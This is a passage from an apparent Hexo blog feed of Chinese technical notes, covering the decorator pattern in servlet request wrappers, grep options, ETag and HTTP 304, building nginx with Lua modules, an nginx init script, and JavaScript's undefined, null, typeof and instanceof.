title="装饰器模式详解"></a>装饰器模式详解</h3><p>这里的tomcat的HttpRequest实现是<code>org.apache.catalina.connector.RequestFacade</code>，这个类实现了<code>HttpServletRequest</code>接口。<br>在<code>HttpServletRequestWrapper</code>类中维护了一个要包装的request对象，而<code>HttpServletRequestWrapper</code>类实现了<code>HttpServletRequest</code>接口。在<code>HttpServletRequestWrapper</code>的实现中，默认都是调用包装对象的方法。我们创建的包装类继承了<code>HttpServletRequestWrapper</code>，在这里我们重写了<code>getSession</code>方法，这里当我们调用<code>getSession</code>方法时会调用自己写的实现。当我们调用其它方法时，会调用父类<code>HttpServletRequestWrapper</code>实现，而在父类中方法的实现却是调用的被包装类的实现。这样就实现了被包装对象的增强。</p><p>这里的核心是，这个包装类。它和被包装对象实现同一个接口，在他内部引用了一个被包装对象。默认首先是调用的被包装对象的实现，当子类重写包装类时，这时在调用就加入了自定义的实现。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-grep.md</title>
      <link href="/post/linux-grep.html"/>
      <url>/post/linux-grep.html</url>
      
        <content type="html"><![CDATA[<h3 id="grep常用用法"><a href="#grep常用用法" class="headerlink" title="grep常用用法"></a>grep常用用法</h3><p>[root@www ~]# grep [-acinv] [–color&#x3D;auto] ‘搜寻字符串’ filename<br>选项与参数：<br>-a ：将 binary 文件以 text 文件的方式搜寻数据<br>-c ：计算找到 ‘搜寻字符串’ 的次数<br>-i ：忽略大小写的不同，所以大小写视为相同<br>-n ：顺便输出行号<br>-v ：反向选择，亦即显示出没有 ‘搜寻字符串’ 内容的那一行！<br>–color&#x3D;auto ：可以将找到的关键词部分加上颜色的显示喔！   </p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>显示行号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -n root /etc/passwd</span><br></pre></td></tr></table></figure><p>显示上下两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep  -C 2 root /etc/passwd</span><br></pre></td></tr></table></figure><p>显示前五行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -B 2 root /etc/passwd  </span><br></pre></td></tr></table></figure><p>显示后两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -A 2 root /etc/passwd  </span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ol><li><a href="http://blog.sina.com.cn/s/blog_716844910100tfxv.html">Linux中查看文件时显示行号</a></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856896.html">【1】</a><a href="http://www.cnblogs.com/mfryf/p/3336288.html">【2】</a> <a href="http://blog.sina.com.cn/s/blog_716844910100tfxv.html">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>etag</title>
      <link href="/post/etag.html"/>
      <url>/post/etag.html</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>有一次查看浏览器控制台，发现好多响应码都是304。我们后台用的Express.js，一般响应的时候没有做什么特殊的操作。那默认情况下应该是200啊。<br>查看express的源码</p><h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>Not Modified 客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。</p><h3 id="etag和304"><a href="#etag和304" class="headerlink" title="etag和304"></a>etag和304</h3>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> etag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>install-openresty</title>
      <link href="/post/install-openresty.html"/>
      <url>/post/install-openresty.html</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><a href="https://openresty.org/">OpenResty</a>是一个叫<a href="https://github.com/openresty/lua-nginx-module">lua-nginx-module</a>的nginx模块发展来的，这个模块能让我们在config文件中编写lua脚本来构建Web应用系统。OpenResty可以让你的Web服务直接跑在 Nginx 服务内部。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="Linux包安装"><a href="#Linux包安装" class="headerlink" title="Linux包安装"></a>Linux包安装</h4><p><a href="https://openresty.org/cn/linux-packages.html">参考</a></p><h4 id="作为nginx模块安装"><a href="#作为nginx模块安装" class="headerlink" title="作为nginx模块安装"></a>作为nginx模块安装</h4><p>准备</p><ol><li><a href="http://luajit.org/download.html">下载</a>LuaJIT</li><li><a href="https://github.com/simpl/ngx_devel_kit/tags">下载</a>最新的<code>ngx_devel_kit</code>模块</li><li><a href="https://github.com/openresty/lua-nginx-module/tags">下载</a>最新的<code>lua-nginx-module</code>模块</li><li><a href="http://nginx.org/">下载</a>最新的nginx</li></ol><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 编译luajit</span><br><span class="line">tar zxvf LuaJIT-2.0.2.tar.gz</span><br><span class="line"></span><br><span class="line">cd LuaJIT-2.0.2</span><br><span class="line"></span><br><span class="line">make install PREFIX=/usr/local/luajit</span><br><span class="line">echo &quot;/usr/local/luajit/lib&quot; &gt; /etc/ld.so.conf.d/usr_local_luajit_lib.conf</span><br><span class="line"></span><br><span class="line">ldconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置luajit环境变量</span><br><span class="line">export LUAJIT_LIB=/usr/local/luajit/lib</span><br><span class="line"></span><br><span class="line">export LUAJIT_INC=/usr/local/luajit/include/luajit-2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 编译nginx</span><br><span class="line"></span><br><span class="line">./configure \</span><br><span class="line">    --with-ld-opt=&quot;-Wl,-rpath,/usr/local/luajit/lib&quot; \</span><br><span class="line">    --add-module=/path/to/ngx_devel_kit \</span><br><span class="line">    --add-module=/path/to/lua-nginx-module</span><br><span class="line"></span><br><span class="line">make -j2</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><blockquote><p>和正常编译nginx差别不大，多了点lua环境的配置</p></blockquote><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="缺少pcre模块"><a href="#缺少pcre模块" class="headerlink" title="缺少pcre模块"></a>缺少pcre模块</h4><p><a href="http://www.linuxfromscratch.org/blfs/view/svn/general/pcre.html">安装文档</a>      </p><blockquote><p><a href="http://www.micmiu.com/enterprise-app/server/nginx-libpcre-so-1/">http://www.micmiu.com/enterprise-app/server/nginx-libpcre-so-1/</a><br>缺少头文件 <code>yum whatprovides */bzlib.h</code> 搜索、安装</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.csdn.net/guowenyan001/article/details/48250427">【1】</a> <a href="https://github.com/openresty/lua-nginx-module#installation">【2】</a> <a href="http://openresty.org/cn/linux-packages.html">【3】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> openresty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx开机启动</title>
      <link href="/post/nginx-as-service.html"/>
      <url>/post/nginx-as-service.html</url>
      
        <content type="html"><![CDATA[<h3 id="开机启动Nginx"><a href="#开机启动Nginx" class="headerlink" title="开机启动Nginx"></a>开机启动Nginx</h3><p>新建nginx开机启动配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/init.d/nginx</span><br></pre></td></tr></table></figure><p>启动脚本</p><blockquote><p>nginxd、nginx_config等根据实际位置需要修改</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"><span class="comment"># chkconfig:         2345 80 20</span></span><br><span class="line"><span class="comment"># description:       Starts and stops a single nginx instance on this system</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:      0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: starts the nginx web server</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">DESC=<span class="string">&quot;nginx daemon&quot;</span></span><br><span class="line">NAME=nginx</span><br><span class="line">DAEMON=/usr/local/nginx/sbin/<span class="variable">$NAME</span></span><br><span class="line">CONFIGFILE=/usr/local/nginx/conf/<span class="variable">$NAME</span>.conf</span><br><span class="line">PIDFILE=/usr/local/nginx/logs/<span class="variable">$NAME</span>.pid</span><br><span class="line">SCRIPTNAME=/etc/init.d/<span class="variable">$NAME</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line">[ -x <span class="string">&quot;<span class="variable">$DAEMON</span>&quot;</span> ] || <span class="built_in">exit</span> 0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_start</span></span>() &#123;</span><br><span class="line">     <span class="variable">$DAEMON</span> -c <span class="variable">$CONFIGFILE</span> || <span class="built_in">echo</span> -n <span class="string">&quot;nginx already running&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_stop</span></span>() &#123;</span><br><span class="line">     <span class="built_in">kill</span> -INT `<span class="built_in">cat</span> <span class="variable">$PIDFILE</span>` || <span class="built_in">echo</span> -n <span class="string">&quot;nginx not running&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_reload</span></span>() &#123;</span><br><span class="line">     <span class="built_in">kill</span> -HUP `<span class="built_in">cat</span> <span class="variable">$PIDFILE</span>` || <span class="built_in">echo</span> -n <span class="string">&quot;nginx can&#x27;t reload&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Starting <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_start</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Stopping <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_stop</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    reload|graceful)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Reloading <span class="variable">$DESC</span> configuration...&quot;</span></span><br><span class="line">        do_reload</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Restarting <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_stop</span><br><span class="line">        do_start</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$SCRIPTNAME</span> &#123;start|stop|reload|restart&#125;&quot;</span> &gt;&amp;2</span><br><span class="line">        <span class="built_in">exit</span> 3</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>注册开机启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/nginx</span><br><span class="line"></span><br><span class="line">chkconfig --add nginx</span><br><span class="line">chkconfig --level 2345 nginx on</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>有时间运行chkconfig –add 时会报<code>服务不支持 chkconfig</code>错误，这种情况下需要在脚本上面添加下面俩个配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chkconfig:         2345 80 20</span><br><span class="line"># description:       Starts and stops a single nginx instance on this system</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.csdn.net/gebitan505/article/details/17606735">nginx开机自动启动脚本</a></li><li><a href="http://www.cnblogs.com/meteoric_cry/archive/2011/01/27/1945882.html">Linux下的Nginx安装(开机自启动)</a> </li><li><a href="http://blog.csdn.net/blueman2012/article/details/6706572">服务不支持 chkconfig　的解决方法</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>undefined</title>
      <link href="/post/undefined.html"/>
      <url>/post/undefined.html</url>
      
        <content type="html"><![CDATA[<h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><h3 id="判断对象是不是undefined"><a href="#判断对象是不是undefined" class="headerlink" title="判断对象是不是undefined"></a>判断对象是不是<code>undefined</code></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> x === <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x === <span class="literal">undefined</span>);</span><br></pre></td></tr></table></figure><p>不要使用<code>==</code>比较，因为<code>null == undefined</code>为true。</p><h3 id="undefined-null"><a href="#undefined-null" class="headerlink" title="undefined &amp; null"></a>undefined &amp; null</h3><p>很多时候<code>undefined</code>和<code>null</code>差别不大，但是二者的<strong>含义</strong>完全不同。</p><p><code>undefined</code>代表<strong>未定义</strong>，而null代表<strong>值为空</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>;    <span class="comment">// &#x27;undefined&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>;         <span class="comment">// &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到<code>null</code>的类型是<code>object</code>，它表示的意思是一个为空的值。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html">undefined与null的区别</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> undefined </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typeof和instanceof</title>
      <link href="/post/typeof-instanceof.html"/>
      <url>/post/typeof-instanceof.html</url>
      
        <content type="html"><![CDATA[<p><code>typeof</code>和<code>instanceof</code>是JavaScript中的两个操作符。一般情况下对于基本类型我们使用<code>typeof</code>，对于对象的具体类型用<code>instanceof</code>。</p><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><p><code>typeof</code>操作符返回一个字符串,表示未经求值的操作数(unevaluated operand)的类型。<br>下面的表格总结了 typeof 可能的返回值。<br><img src="/images/QQ20160824-0@2x.jpg"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Numbers</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">37</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="number">3.14</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="title function_">typeof</span>(<span class="number">42</span>) === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Math</span>.<span class="property">LN2</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Infinity</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span> === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// Despite being &quot;Not-A-Number&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Number</span>(<span class="number">1</span>) === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Strings</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;&#x27;</span> === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;bla&#x27;</span> === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;1&#x27;</span> === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// note that a number within a string is still typeof string</span></span><br><span class="line"><span class="title function_">typeof</span> (<span class="keyword">typeof</span> <span class="number">1</span>) === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// typeof always returns a string</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>) === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Booleans</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span> === <span class="string">&#x27;boolean&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">false</span> === <span class="string">&#x27;boolean&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;boolean&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Symbols</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>() === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>(<span class="string">&#x27;foo&#x27;</span>) === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>.<span class="property">iterator</span> === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span> === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"><span class="comment">// 定义为初始化</span></span><br><span class="line"><span class="keyword">typeof</span> declaredButUndefinedVariable === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"><span class="comment">// 未定义</span></span><br><span class="line"><span class="keyword">typeof</span> undeclaredVariable === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Objects</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">a</span>: <span class="number">1</span>&#125; === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use Array.isArray or Object.prototype.toString.call</span></span><br><span class="line"><span class="comment">// to differentiate regular objects from arrays</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>] === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Date</span>() === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The following is confusing. Don&#x27;t use!</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">1</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Functions</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125; === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">class</span> <span class="title class_">C</span> &#123;&#125; === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Math</span>.<span class="property">sin</span> === <span class="string">&#x27;function&#x27;</span>;</span><br></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// null is a null Object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span> === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其它都是object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Date</span>() === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">1</span>) ==== <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>) === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><p><code>instanceof</code>运算符可以用来判断某个构造函数的<code>prototype</code>属性所指向的對象是否存在于另外一个要检测对象的原型链上。</p><p><code>instanceof</code>运算符希望左操作数是一个对象，右操作数标识对象的类。如果左侧的对象是右侧类的实例，则表达式返回true；否则返回false。</p><p>为了计算表达式<code>o instanceof f</code>，JavaScript首先计算<code>f.prototype</code>，然后在原型链中查找o，如果找到，那么o是f（或者f的父类）的一个实例，表达式返回true。如果f.prototype不在o的原型链中的话，那么o就不是f的实例，instanceof返回false。</p><p>原型链<br><img src="/images/1374057134_4751.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">y</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">x</span> = <span class="number">10</span>;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">calculate</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">b.<span class="property">__proto__</span> === <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// true </span></span><br><span class="line">b.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(b); <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line">b <span class="keyword">instanceof</span> <span class="title class_">Foo</span>; <span class="comment">// true </span></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(b); <span class="comment">// true </span></span><br></pre></td></tr></table></figure><p>JavaScript中有个原型链的概念，这个<code>链</code>一般是通过对象的<code>__proto__</code>属性来建立的。<code>prototype</code>代表原型，<code>prototype</code>对象都有一个<code>constructor</code>属性，指向它的构造函数。这里的<code>instanceof</code>就是去判断是否在一条原型链上。</p><h3 id="Object-prototype-toString"><a href="#Object-prototype-toString" class="headerlink" title="Object.prototype.toString()"></a>Object.prototype.toString()</h3><p>每个对象都有一个<code>toString()</code>方法，当该对象被表示为一个文本值时，或者一个对象以预期的字符串方式引用时自动调用。默认情况下，<code>toString()</code>方法被每个<code>Object</code>对象继承。如果此方法在自定义对象中未被覆盖，<code>toString()</code> 返回 <code>[object type]</code>，其中<code>type</code>是对象的类型。以下代码说明了这一点：</p><p>可以通过<code>toString()</code> 